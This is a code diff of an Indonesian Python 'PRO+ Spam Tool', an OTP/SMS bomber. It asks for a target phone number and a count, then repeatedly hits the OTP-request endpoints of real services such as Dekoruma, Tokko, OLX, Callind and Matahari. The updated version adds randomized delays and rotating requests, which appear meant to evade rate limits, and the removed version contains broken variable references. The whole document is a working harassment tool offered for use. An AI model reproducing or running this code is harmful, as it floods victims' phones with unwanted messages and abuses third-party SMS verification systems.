@@ -1,95 +1,161 @@
+# PRO+ Version by MR.M05T3R
 try:
-    import os,sys,time,requests,json,random
-    from colorama import Fore,Back,init
+    import os, sys, time, random, json, requests
+    from colorama import Fore, init
+    from tqdm import tqdm
 except ModuleNotFoundError:
-    print(f"{W}[{R}!{W}] Module Tidak Tersedia{abu}...")
-    time.sleep(5)
-    print(f"{W}[{R}!{W}] Type{R}:{Y}pip{W} install colorama requests")
+    os.system("pip install colorama requests tqdm")
+    import os, sys, time, random, json, requests
+    from colorama import Fore, init
+    from tqdm import tqdm
 
-B = Fore.BLUE
-W = Fore.WHITE
+init(autoreset=True)
+
+# Colors
 R = Fore.RED
 G = Fore.GREEN
-BL = Fore.BLACK
 Y = Fore.YELLOW
-Hijau="\033[1;92m"
-putih="\033[1;97m"
-abu="\033[1;90m"
-kuning="\033[1;93m"
-ungu="\033[1;95m"
-merah="33[37;1m"
-biru="\033[1;96m"
-#Tulisan Background Merah
-bg="\033[1;0m\033[1;41mText\033[1;0m"
+C = Fore.CYAN
+W = Fore.WHITE
 
-def mr_wibu():
-    mr_tytyd = input(f"{W}Replay? {biru}({W}y{Y}/{W}n{biru}){R}:{G} ")
-    if mr_tytyd=="y" or mr_tytyd=="Y":
-        time.sleep(5)
-        put()
-    if mr_tytyd=="n" or mr_tytyd=="N":
-        sys.exit(f"{W}[{R}!{W}] Exited With Program{abu}....{W}")
-        time.sleep(5)
+def loading_animation(text, duration=2):
+    for _ in range(duration):
+        for frame in "|/-\\":
+            print(f"\r{C}{text} {frame}", end="")
+            time.sleep(0.1)
+    print("\r", end="")
 
-def logo_taekyung():
+def random_delay():
+    return random.uniform(2, 5)  # delay 2-5 detik random
+
+def send_request(api_name, url, headers, data, method='POST'):
     try:
-        mr_ip=requests.get('https://api.ipify.org').text
-        mr_time=time.asctime(time.localtime(time.time()))
-        os.system("clear")
-        print (f"{biru}Subscribe Channel {W}Aing Dulu {biru}Sluur !!!!")
-        os.system("xdg-open https://whatsapp.com/channel/0029VaA604P8PgsAClQgvf2O")
-        time.sleep(5)
-        os.system("clear")
-        print(f"""
-{biru}╔═╗{W}┌┬┐┌─┐    {ungu}╦ ╦{W}┌┐┌┬  ┬ {abu}| {B}»{Y}⟩{W} Creator {R}:{W} MR.M05T3R {W}(FOUNDER NCS)
-{biru}╚═╗{W}│││└─┐ ── {ungu}║ ║{W}││││  │ {abu}| {B}»{Y}⟩{W} Github {R}: \033[4;92mMRM05T3R\033[1;0m
-{biru}╚═╝{W}┴ ┴└─┘    {ungu}╚═╝{W}┘└┘┴─┘┴ {abu}| {B}»{Y}⟩{W} Team {R}:{G} NEWBIE CYBER SECURITY
-{W}[{Y}•{W}] Ip Info {R}:{G} {mr_ip}
-{W}[{Y}•{W}] Info Waktu {W}:{G} {mr_time}
+        if method == 'POST':
+            response = requests.post(url, headers=headers, data=json.dumps(data), timeout=10)
+        else:
+            response = requests.get(url, headers=headers, params=data, timeout=10)
+        return response
+    except Exception as e:
+        return None
+
+def spammer(phone_number, total):
+    success = 0
+    fail = 0
+
+    api_list = [
+        {
+            "name": "Dekoruma",
+            "url": "https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",
+            "headers": {
+                "Host": "auth.dekoruma.com",
+                "Content-Type": "application/json",
+                "Origin": "https://m.dekoruma.com",
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
+            },
+            "data": lambda phone: {"phoneNumber": phone, "platform": "sms"},
+            "method": "POST"
+        },
+        {
+            "name": "Tokko",
+            "url": "https://api.tokko.io/graphql",
+            "headers": {
+                "Host": "api.tokko.io",
+                "Content-Type": "application/json",
+                "Origin": "https://web.lummoshop.com",
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
+            },
+            "data": lambda phone: {
+                "operationName": "generateOTP",
+                "variables": {
+                    "generateOtpInput": {
+                        "phoneNumber": phone,
+                        "hashCode": "",
+                        "channel": "SMS",
+                        "userType": "MERCHANT"
+                    }
+                },
+                "query": "mutation generateOTP($generateOtpInput: GenerateOtpInput!) { generateOtp(generateOtpInput: $generateOtpInput) { phoneNumber } }"
+            },
+            "method": "POST"
+        },
+        {
+            "name": "OLX",
+            "url": "https://www.olx.co.id/api/auth/authenticate",
+            "headers": {
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
+            },
+            "data": lambda phone: {
+                "grantType": "retry",
+                "method": "sms",
+                "phone": phone.replace("+", ""),  # OLX tidak pakai +
+                "language": "id"
+            },
+            "method": "POST"
+        },
+        {
+            "name": "Callind",
+            "url": "https://api.callind.com/api/v1/auth/register",
+            "headers": {
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
+            },
+            "data": lambda phone: {"phone": phone},
+            "method": "POST"
+        },
+        {
+            "name": "Matahari",
+            "url": "https://www.matahari.com/rest/V1/thor-authentication/token",
+            "headers": {
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
+            },
+            "data": lambda phone: {"username": phone},
+            "method": "POST"
+        }
+    ]
+
+    print(f"\n{W}[{G}+{W}] Mulai mengirim spam ke {Y}{phone_number} {W}sebanyak {Y}{total}{W}x\n")
+
+    for _ in tqdm(range(total), desc="Progress", ncols=75, colour='CYAN'):
+        selected_api = random.choice(api_list)
+        payload = selected_api["data"](phone_number)
+        response = send_request(selected_api["name"], selected_api["url"], selected_api["headers"], payload, selected_api["method"])
+
+        if response and response.status_code in [200, 201]:
+            print(f"{W}[{G}✓{W}] {selected_api['name']} - {G}Success")
+            success += 1
+        else:
+            print(f"{W}[{R}✗{W}] {selected_api['name']} - {R}Failed")
+            fail += 1
+
+        time.sleep(random_delay())
+
+    print(f"\n{W}[{G}+{W}] Total sukses: {G}{success} {W}| Total gagal: {R}{fail}\n")
+    print(f"{C}Selesai spam ke {phone_number}.\n")
+
+def banner():
+    os.system("clear")
+    print(f"""{C}
+╔═╗┬ ┬┬─┐┬ ┬┌─┐┬─┐
+║ ╦│ │├┬┘│ ││ │├┬┘
+╚═╝└─┘┴└─└─┘└─┘┴└─
+{W}PRO+ Spam Tool | by {Y}MR.M05T3R
 """)
-    except requests.exceptions.ConnectionError:
-        sys.exit(f"{W}[{R}!{W}] Koneksi Eror Silakan Cek Jaringan Anda{abu}....{abu}")
-    except KeyboardInterrupt:
-        sys.exit(f"{W}[{R}!{W}] Exited With Program{abu}...{W}")
-        
 
-def put():
-    logo_taekyung()
+if __name__ == "__main__":
+    banner()
     try:
-        mr_ua=random.choice(["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646","Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"])
-        mr_ip=requests.get('https://api.ipify.org').text
-        mr_ammar=input(f"{W}[{biru}?{W}] Target Number {biru}(Ex{R}:{W}8xx{biru}) {R}»{Y}⟩{W} ")
-        power_python=int(input(f"{W}[{biru}?{W}] Total Spam {R}»{Y}⟩{W} "))
-        print ("")
-        for i in range(int(power_python)):
-            time.sleep(8)
-            dekor2=requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers={"Host":"auth.dekoruma.com","save-data":"on","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://m.dekoruma.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.dekoruma.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phoneNumber":"+62"+mr_ammar,"platform":"sms"})).text
-            if "ok" in dekor2:
-                print (f"{W}[{G}✓{W}] Sukses Sending Spam To {Y}{mr_m05t3r}")
-            else:
-                print (f"{W}[{R}×{W}] Gagal Sending Spam To {Y}{mr_m05t3r}")
-            time.sleep(8)
-            lummo={"Host":"api.tokko.io","accept-language":"id","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"}
-            gas=json.dumps({"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+mr_ammar,"hashCode":"","channel":"SMS","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"})
-            gaskeun=requests.post("https://api.tokko.io/graphql",headers=lummo,data=gas).text
-            if "erors" in gaskeun:
-                print (f"{W}[{R}×{W}] Gagal Sending Spam To {Y}{mr_m05t3r}")
-            else:
-                print (f"{W}[{G}✓{W}] Sukses Sending Spam To {Y}{mr_m05t3r}")
-            time.sleep(8)
-            AmmarGamteng=requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "sms","phone":"62"+mr_ammar,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": mr_ua,"content-type": "application/json"}).text
-            if "PENDING" in MR.M05T3R:
-                print (f"{W}[{G}✓{W}] Sukses Sending Spam To {Y}{mr_m05t3r}")
-            else:
-                print (f"{W}[{R}×{W}] Gagal Sending Spam To {Y}{mr_m05t3r}{W}")
-        mr_wibu()
-    except requests.exceptions.ConnectionError:
-        sys.exit(f"{W}[{R}!{W}] Koneksi Eror Silakan Cek Jaringan Anda{abu}....{abu}")
+        phone = input(f"{W}[{Y}?{W}] Masukkan Nomor (ex: +62812xxxx) {R}:{G} ").strip()
+        if not phone.startswith('+') or not phone[1:].isdigit():
+            print(f"{W}[{R}!{W}] Format salah! Harus awali dengan + dan angka saja.")
+            sys.exit()
+        total = int(input(f"{W}[{Y}?{W}] Berapa kali spam {R}:{G} "))
+        loading_animation("Memulai")
+        spammer(phone, total)
     except KeyboardInterrupt:
-        sys.exit(f"{W}[{R}!{W}] Exited With Program{abu}...{W}")
-    except ValueError:
-        sys.exit(f"{W}[{Y}!{W}] Masukkan Dengan Benar Kak{abu}.....")
-        
-
-if __name__=='__main__':
-    put()
+        print(f"\n{W}[{R}!{W}] Dibatalkan pengguna")
+        sys.exit()
+    except Exception as e:
+        print(f"{W}[{R}Error{W}] {e}")
+        sys.exit()
